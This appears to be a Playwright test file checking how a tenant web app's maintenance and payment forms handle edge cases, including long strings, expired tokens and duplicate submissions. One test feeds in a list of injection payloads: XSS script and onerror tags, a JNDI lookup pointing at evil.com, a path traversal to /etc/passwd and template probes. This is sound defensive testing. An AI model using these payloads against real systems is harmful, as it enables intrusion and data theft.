import { test, expect } from '@playwright/test';

/**
 * P0-004: Edge Case Tests - Form Validation Edge Cases
 * Tests for very long inputs, special characters, file uploads, and token expiration
 */
test.describe('Form Edge Cases', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('http://localhost:5173/login');
    
    // Login
    await page.fill('input[type="text"]', 'tenant@test.com');
    await page.fill('input[type="password"]', 'password123');
    await page.click('button[type="submit"]');
    
    await page.waitForURL('**/dashboard', { timeout: 5000 });
  });

  test('should handle very long input strings', async ({ page }) => {
    await page.goto('http://localhost:5173/maintenance');
    
    // Find and open create maintenance request form
    const createButton = page.locator('button:has-text("Create")').or(page.locator('button:has-text("New")')).first();
    if (await createButton.isVisible()) {
      await createButton.click();
      
      // Try to enter very long string (10,000 characters)
      const longString = 'A'.repeat(10000);
      const titleInput = page.locator('input[placeholder*="title" i], input[placeholder*="Title" i]').first();
      
      if (await titleInput.isVisible()) {
        await titleInput.fill(longString);
        
        // Should either truncate, show validation error, or handle gracefully
        const value = await titleInput.inputValue();
        expect(value.length).toBeLessThanOrEqual(10000);
        
        // Should not crash or break layout
        await expect(page.locator('body')).toBeVisible();
      }
    }
  });

  test('should handle special characters in inputs', async ({ page }) => {
    await page.goto('http://localhost:5173/maintenance');
    
    const createButton = page.locator('button:has-text("Create")').first();
    if (await createButton.isVisible()) {
      await createButton.click();
      
      // Test various special characters
      const specialChars = [
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        '../../etc/passwd',
        'SELECT * FROM users',
        '"><img src=x onerror=alert(1)>',
        '&lt;script&gt;',
        '{{7*7}}',
        '${7*7}',
      ];
      
      const descriptionInput = page.locator('textarea, input[type="text"]').filter({ hasText: /description|Description/i }).first();
      
      if (await descriptionInput.isVisible()) {
        for (const specialChar of specialChars) {
          await descriptionInput.fill(specialChar);
          
          // Should sanitize or reject, not execute
          const value = await descriptionInput.inputValue();
          expect(value).toBeDefined();
          
          // Page should not show alert or execute script
          const alertHandled = await page.evaluate(() => {
            return typeof window.alert === 'function';
          });
          expect(alertHandled).toBeTruthy();
        }
      }
    }
  });

  test('should enforce file upload size limits', async ({ page }) => {
    await page.goto('http://localhost:5173/maintenance');
    
    const createButton = page.locator('button:has-text("Create")').first();
    if (await createButton.isVisible()) {
      await createButton.click();
      
      // Look for file upload input
      const fileInput = page.locator('input[type="file"]').first();
      
      if (await fileInput.isVisible()) {
        // Create a large file (simulate >10MB)
        // Note: Playwright can't create actual large files easily, so we test the UI
        // In real scenario, would test with actual large file
        
        // Check if there's a size limit message
        const sizeLimitMessage = page.locator('text=/size|limit|MB|KB/i');
        const hasSizeLimit = await sizeLimitMessage.count() > 0;
        
        // Should have some indication of file size limits
        expect(hasSizeLimit || fileInput.isVisible()).toBeTruthy();
      }
    }
  });

  test('should handle form submission with expired token', async ({ page, context }) => {
    await page.goto('http://localhost:5173/maintenance');
    
    // Intercept API calls and return 401 (expired token)
    await context.route('**/api/maintenance**', async (route) => {
      if (route.request().method() === 'POST') {
        await route.fulfill({
          status: 401,
          body: JSON.stringify({ message: 'Token expired' }),
          headers: { 'Content-Type': 'application/json' },
        });
      } else {
        await route.continue();
      }
    });
    
    const createButton = page.locator('button:has-text("Create")').first();
    if (await createButton.isVisible()) {
      await createButton.click();
      
      // Fill form
      const titleInput = page.locator('input[placeholder*="title" i]').first();
      if (await titleInput.isVisible()) {
        await titleInput.fill('Test Request');
        
        // Submit
        const submitButton = page.locator('button[type="submit"]').first();
        if (await submitButton.isVisible()) {
          await submitButton.click();
          
          // Should redirect to login or show token expiration message
          await page.waitForTimeout(2000);
          
          const isLoginPage = page.url().includes('/login');
          const hasExpiredMessage = (await page.locator('text=/expired|session|login/i').count()) > 0;
          
          expect(isLoginPage || hasExpiredMessage).toBeTruthy();
        }
      }
    }
  });

  test('should validate required fields', async ({ page }) => {
    await page.goto('http://localhost:5173/maintenance');
    
    const createButton = page.locator('button:has-text("Create")').first();
    if (await createButton.isVisible()) {
      await createButton.click();
      
      // Try to submit without filling required fields
      const submitButton = page.locator('button[type="submit"]').first();
      if (await submitButton.isVisible()) {
        await submitButton.click();
        
        // Should show validation errors
        await page.waitForTimeout(1000);
        
        const validationErrors = page.locator('text=/required|invalid|error/i');
        const hasErrors = await validationErrors.count() > 0;
        
        // Should prevent submission and show errors
        expect(hasErrors).toBeTruthy();
      }
    }
  });

  test('should handle rapid form submissions', async ({ page, context }) => {
    await page.goto('http://localhost:5173/maintenance');
    
    let requestCount = 0;
    
    await context.route('**/api/maintenance**', async (route) => {
      if (route.request().method() === 'POST') {
        requestCount++;
        await new Promise(resolve => setTimeout(resolve, 500)); // Simulate processing
        await route.continue();
      } else {
        await route.continue();
      }
    });
    
    const createButton = page.locator('button:has-text("Create")').first();
    if (await createButton.isVisible()) {
      await createButton.click();
      
      const titleInput = page.locator('input[placeholder*="title" i]').first();
      if (await titleInput.isVisible()) {
        await titleInput.fill('Test Request');
        
        const submitButton = page.locator('button[type="submit"]').first();
        if (await submitButton.isVisible()) {
          // Click submit multiple times rapidly
          await submitButton.click();
          await submitButton.click();
          await submitButton.click();
          
          await page.waitForTimeout(2000);
          
          // Should only submit once (prevent duplicate submissions)
          expect(requestCount).toBeLessThanOrEqual(2); // Allow for retry, but not multiple submissions
        }
      }
    }
  });

  test('should handle numeric input validation', async ({ page }) => {
    await page.goto('http://localhost:5173/payments');
    
    // Look for amount input fields
    const amountInputs = page.locator('input[type="number"], input[inputmode="numeric"]');
    const count = await amountInputs.count();
    
    if (count > 0) {
      const firstAmountInput = amountInputs.first();
      await firstAmountInput.fill('not a number');
      
      // Should show validation error or prevent invalid input
      const value = await firstAmountInput.inputValue();
      const isNumeric = !isNaN(parseFloat(value)) && isFinite(parseFloat(value));
      
      // Either should be empty, show error, or be sanitized
      expect(value === '' || !isNumeric || page.locator('text=/invalid|error/i').count() > 0).toBeTruthy();
    }
  });
});

